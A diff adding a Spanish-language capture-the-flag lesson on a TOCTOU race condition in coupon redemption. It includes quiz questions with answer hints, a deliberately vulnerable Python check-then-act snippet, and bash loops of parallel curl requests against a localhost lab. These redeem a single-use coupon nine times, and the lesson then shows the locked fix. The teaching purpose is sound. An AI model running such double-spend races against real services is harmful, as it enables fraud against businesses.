@@ -1,0 +1,79 @@
+---
+index: 1
+title: "TOCTOU y double-spend de cupones"
+questions:
+  - id: race-condition-t01-q01
+    prompt: "¿Qué acrónimo describe la vulnerabilidad check-then-act (comprobar-una-cosa, usar-otra)?"
+    hint: "Time-Of-Check To Time-Of-Use"
+    kind: text
+  - id: race-condition-t01-q02
+    prompt: "Canjea WELCOME10 con 15 requests SECUENCIALES (uno tras otro). ¿Cuántos usos registra el servidor al final? (ver /status)"
+    hint: "Secuencial no hay carrera: el check del 2º request ya ve el uso del 1º"
+    kind: text
+  - id: race-condition-t01-q03
+    prompt: "Ahora lanza 15 requests PARALELOS a /redeem?code=WELCOME10. Envía la flag del logro DOUBLE_SPEND."
+    hint: "for i in $(seq 1 15); do curl 'http://127.0.0.1:18099/redeem?code=WELCOME10' & done; wait — la flag aparece cuando uses >= 5"
+    kind: flag
+---
+
+## El patrón check-then-act
+
+El endpoint vulnerable hace esto:
+
+```python
+# CHECK — ¿ya se usó el cupón?
+if uses >= coupon['max_uses']:
+    return error('coupon already used')
+
+time.sleep(0.1)   # ventana de carrera: "latencia de base de datos"
+
+# ACT — incrementa el uso y suma el balance
+state['coupon_uses'][code] += 1
+state['balance'] += coupon['value']
+```
+
+Si dos requests llegan **dentro de la ventana de 0.1s**, ambos leen
+`uses = 0`, ambos pasan el check, y ambos canjean. El cupón de un solo uso
+se canjea dos veces. Eso es un **double-spend**.
+
+## Comprueba que secuencial NO funciona
+
+```bash
+# Levanta el lab primero (ver panel del lab arriba).
+# Versión secuencial — uno a uno:
+for i in $(seq 1 15); do curl -s "http://127.0.0.1:18099/redeem?code=WELCOME10"; done | tail -3
+# Siempre termina en: {"error": "coupon already used", "uses": 1}
+
+curl -s http://127.0.0.1:18099/reset   # reinicia el estado para reintentar
+```
+
+Cada request espera al anterior: el check del segundo ya ve el incremento
+del primero. Sin concurrencia no hay carrera.
+
+## El ataque paralelo
+
+```bash
+curl -s http://127.0.0.1:18099/reset > /dev/null
+
+# 15 requests SIMULTÁNEOS (el & los lanza en background, wait los junta):
+for i in $(seq 1 15); do curl -s "http://127.0.0.1:18099/redeem?code=WELCOME10" & done; wait
+
+curl -s http://127.0.0.1:18099/status
+# "coupon_uses": {"WELCOME10": 9}  ← un cupón de 1 uso, canjeado 9 veces
+```
+
+En herramientas de pentest real esto se hace con **Turbo Intruder**
+(extensión de Burp Suite, miles de requests por segundo) o con el modo
+`-P` de `curl_parallel`, pero el `for + & + wait` de bash es suficiente
+aquí: lo importante es que los requests **se solapen en la ventana**.
+
+## La versión segura
+
+```bash
+curl -s "http://127.0.0.1:18099/redeem-safe?code=MEGA50"   # ok, uses: 1
+curl -s "http://127.0.0.1:18099/redeem-safe?code=MEGA50"   # 409: already used
+```
+
+`/redeem-safe` hace el check y el act **dentro del mismo lock**
+(`with lock:`), haciendo la secuencia atómica. La única diferencia entre
+vulnerable y seguro es dónde empieza el lock — esa es toda la lección.
